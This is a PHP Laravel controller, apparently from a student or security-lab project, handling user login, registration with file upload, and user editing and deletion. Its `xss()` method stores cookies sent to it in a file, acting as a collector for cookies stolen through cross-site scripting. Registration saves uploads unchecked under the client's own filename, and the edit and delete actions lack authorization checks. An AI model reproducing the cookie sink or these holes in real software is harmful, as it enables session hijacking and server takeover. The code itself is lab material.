<?php
namespace App\Http\Controllers;

use Illuminate\Support\Facades\File;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Session;
use App\Models\User;
use Illuminate\Support\Facades\Auth;
use Illuminate\Pagination\LengthAwarePaginator;

//Unknow
class CustomAuthController extends Controller
{
    public function index()
    {
        return view('auth.login');
    }

    public function customLogin(Request $request)
    {

        $email = $request->get('email');
        $data = $request->all();
        $request->validate([
            'email' => 'required',
            'password' => 'required',
        ]);

        $credentials = $request->only('email', 'password');
        if (Auth::attempt($credentials)) {
            return redirect()->intended('dashboard')
                ->withSuccess('Signed in');
        }

        return redirect("login")->withSuccess('Login details are not valid');
    }

    public function registration()
    {
        return view('auth.registration');
    }

    public function customRegistration(Request $request)
    {
        $request->validate([
            'name' => 'required',
           'email' => 'required|email|unique:users',
           'password' => 'required|min:6',
        ]);

        $data = $request->all();
        //upload
        $file = $request->file('fileToUpload');
        $fileName = $file->getClientOriginalName();
        $destinationPath = 'uploads';
        $file->move($destinationPath, $file->getClientOriginalName());

        $data['fileName'] = $fileName;
        $check = $this->create($data);

        return redirect("login")->withSuccess('You have signed-in');
    }

    public function create(array $data)
    {
        return User::create([
            'name' => $data['name'],
            'email' => $data['email'],
            'hobby' => $data['hobby'],
            'phone' => $data['phone'],
            'image' => $data['fileName'],
            'password' => Hash::make($data['password'])
        ]);
    }
    public function xss(Request $request) {		
        $cookie = $request->get('cookie');		
        file_put_contents('xss.txt', $cookie);		
        var_dump($cookie);
        die();		
        }		
    public function dashboard()
    {
        if (Auth::check()) {
            return view('auth.viewuser');
        }
        return redirect("login")->withSuccess('You are not allowed to access');
    }
    public function signOut()
    {
        Session::flush();
        Auth::logout();
        return Redirect('login');
    }
    public function user(){
        $data = User::orderBy('id','DESC')->paginate(3);
        return view('auth.user',compact('data'))->with('i',(request()->input('page',1)-1)*3);
    }
    public function show()
    {
        $user = User::all();
        return view('auth.viewuser', compact('user'));
    }


    public function edit($id)
    {
        //tim user theo id
        $user = user::find($id);
        return view('auth.edit', compact('user'));
    }

    public function update(Request $request, $id)
    {
        //tim user theo id
        $user = User::find($id);
        $user->name = $request->input('name');
        $user->email = $request->input('email');
        $user->phone = $request->input('phone');
        $user->hobby = $request->input('hobby');
        if ($request->hasFile('image')) {
            //co file dinh kem trong form update thi tim file cu va xoa di
            //neu truoc do ko co anh dai dien cu thi ko xoa
            $anhcu = 'uploads/students/' . $user->anhdaidien;
            if (File::exists($anhcu)) {
                File::delete($anhcu);
            }
            $file = $request->file('image');
            $extension = $file->getClientOriginalExtension(); //lay ten mo rong .jpg, .png,....
            $filename = time() . '.' . $extension;
            $file->move('uploads/students/', $filename);  //upload len thu muc uploads/students
            $user->anhdaidien = $filename;
        }
        $user->update();
        return redirect()->back()->with('status', 'Cap nhat sinh vien voi anh dai dien thanh cong');
    }

    public function delete($id)
    {
        $user = User::find($id);
        $anhdaidien = 'uploads/students/' . $user->anhdaidien;
        if (File::exists($anhdaidien)) {
            File::delete($anhdaidien);
        }
        $user->delete();
        return redirect()->back()->with('status', 'Xóa sinh viên và ảnh đại diện thành công');
    }

}
